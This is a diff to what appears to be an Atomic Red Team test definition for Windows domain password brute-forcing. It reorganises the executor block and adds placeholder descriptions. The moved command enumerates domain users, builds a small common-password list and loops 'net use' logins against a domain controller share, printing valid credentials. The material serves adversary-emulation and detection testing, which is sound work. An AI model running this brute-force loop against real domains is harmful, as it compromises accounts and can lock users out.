@@ -8,23 +8,33 @@ atomic_tests:
     Creates username and password files then attempts to brute force on remote host
   supported_platforms:
     - windows
-  executor: command_prompt
   input_arguments:
     input_file_users:
+      description: |
+        xxx
       type: Path
       default: DomainUsers.txt
     input_file_passwords:
+      description: |
+        xxx
       type: Path
       default: passwords.txt
     remote_host:
+      description: |
+        xxx
       type: String
       default: \\COMPANYDC1\IPC$
     domain:
+      description: |
+        xxx
       type: String
       default: COMPANY
-  command: |
-    net user /domain > #{input_file_users}
-    echo "Password1" >> #{input_file_passwords}
-    echo "1q2w3e4r" >> #{input_file_passwords}
-    echo "Password!" >> #{input_file_passwords}
-    @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete {#remote_host} > NUL
+
+  executor:
+    name: command_prompt
+    command: |
+      net user /domain > #{input_file_users}
+      echo "Password1" >> #{input_file_passwords}
+      echo "1q2w3e4r" >> #{input_file_passwords}
+      echo "Password!" >> #{input_file_passwords}
+      @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete {#remote_host} > NUL
